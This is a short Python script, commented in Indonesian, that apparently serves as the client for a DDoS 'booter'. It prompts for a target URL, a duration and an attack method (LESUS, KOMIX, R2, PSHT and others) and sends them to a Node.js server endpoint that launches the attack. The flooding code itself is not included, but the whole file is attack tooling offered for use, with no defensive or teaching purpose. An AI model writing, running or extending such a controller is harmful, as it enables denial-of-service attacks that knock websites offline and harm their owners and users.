import requests

# Ganti dengan IP VPS atau URL server tempat script Node.js kamu berjalan
API_URL = "http://localhost:5032/exc"

def kirim_perintah():
    target = input("Masukkan Target (URL): ")
    waktu = input("Masukkan Durasi (detik): ")
    metode = input("Masukkan Metode (LESUS/KOMIX/R2/PSHT/pidoras): ")

    params = {
        'target': target,
        'time': waktu,
        'methods': metode
    }

    try:
        response = requests.get(API_URL, params=params)
        if response.status_code == 200:
            print("\nSUKSES!")
            print(f"Respon Server: {response.json().get('message')}")
        else:
            print(f"\nGagal. Status Code: {response.status_code}")
    except Exception as e:
        print(f"\nTerjadi error: {e}")

if __name__ == "__main__":
    kirim_perintah()
